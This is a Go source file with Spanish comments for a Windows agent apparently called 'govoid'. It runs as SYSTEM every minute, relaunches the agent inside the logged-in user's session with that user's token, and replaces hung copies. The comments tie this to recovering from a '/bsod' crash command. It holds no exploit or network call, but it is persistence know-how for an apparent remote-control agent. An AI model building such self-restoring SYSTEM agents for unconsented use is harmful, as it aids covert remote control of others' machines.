//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/win32"
)

// runSessionWatch corre como SYSTEM desde la tarea de arranque, no desde una
// sesión de usuario.
//
// Su único trabajo es que el agente exista dentro de la sesión de la consola.
// En cada disparo mira esa sesión: si ya hay un agente sano no hace nada; si hay
// usuario pero no agente lo arranca con el token del usuario; y si todavía no
// hay nadie logueado —pantalla de inicio de sesión— sale sin ruido y la tarea lo
// reintenta al minuto siguiente.
//
// Es la capa que devuelve el agente después de un bugcheck: las tareas ONLOGON y
// ONSTART son "solo interactivas" y no pueden dispararse en la pantalla de
// inicio de sesión, que es justo donde queda el equipo tras /bsod.
func runSessionWatch() {
	say := sessionWatchLogger()
	defer say.close()

	session, err := win32.ActiveConsoleSession()
	if err != nil {
		say.logf("sin sesión de consola: %v", err)
		return
	}

	if running := win32.RunningInSession(config.BinaryName, session); running > 0 {
		// Un agente que late está sano: el disparo se repite cada minuto y
		// escribir la nada llenaría el diario sin decir nada útil.
		if win32.HeartbeatFresh(5 * time.Minute) {
			return
		}
		// Proceso vivo pero sin latido: se quedó colgado antes de conectar.
		// Se retira y se arranca uno nuevo en el mismo disparo.
		say.logf("sesión %d: %d agente(s) sin latido, reiniciando", session, running)
		win32.TakeOverStaleAgent()
		time.Sleep(2 * time.Second)
	}

	exe, err := os.Executable()
	if err != nil {
		say.logf("no se pudo resolver el ejecutable: %v", err)
		return
	}

	pid, err := win32.LaunchInSession(session, exe, nil)
	if err != nil {
		// Sin usuario logueado el fallo es esperado y se reintenta al minuto.
		say.logf("sesión %d: no se pudo arrancar: %v", session, err)
		return
	}
	say.logf("sesión %d: agente arrancado pid=%d desde %s", session, pid, exe)
}

// runSessionProbe prueba cada variante del arranque entre sesiones y escribe el
// resultado. CreateProcessAsUser devuelve ERROR_INVALID_PARAMETER sin decir qué
// parámetro rechaza; esto lo dice.
func runSessionProbe() {
	say := sessionWatchLogger()
	defer say.close()

	session, err := win32.ActiveConsoleSession()
	if err != nil {
		say.logf("probe: sin sesión de consola: %v", err)
		return
	}

	exe, err := os.Executable()
	if err != nil {
		say.logf("probe: no se pudo resolver el ejecutable: %v", err)
		return
	}

	say.logf("probe: sesión %d, exe %s", session, exe)
	for _, line := range win32.LaunchInSessionProbe(session, exe) {
		say.logf("probe: %s", line)
	}
}

// sessionWatchLog escribe un diario corto y propio. El de SYSTEM no puede
// compartir el del agente: setupLogging() corre después del despacho de modos y
// aquí todavía no hay logger.
type sessionWatchLog struct {
	file *os.File
}

func (w sessionWatchLog) logf(format string, args ...any) {
	if w.file == nil {
		return
	}
	line := time.Now().Format("2006-01-02 15:04:05.000") + " " + fmt.Sprintf(format, args...) + "\n"
	_, _ = w.file.WriteString(line)
	_ = w.file.Sync()
}

func (w sessionWatchLog) close() {
	if w.file != nil {
		_ = w.file.Close()
	}
}

// sessionWatchLogger abre el diario y lo recorta a 256 KB: la tarea dispara cada
// minuto y sin tope el archivo crecería sin fin en una máquina que nadie mira.
func sessionWatchLogger() sessionWatchLog {
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	dir := filepath.Join(programData, config.DataDirName)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return sessionWatchLog{}
	}

	path := filepath.Join(dir, "sessionwatch.log")
	if info, err := os.Stat(path); err == nil && info.Size() > 256*1024 {
		_ = os.Remove(path)
	}

	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		return sessionWatchLog{}
	}
	return sessionWatchLog{file: file}
}
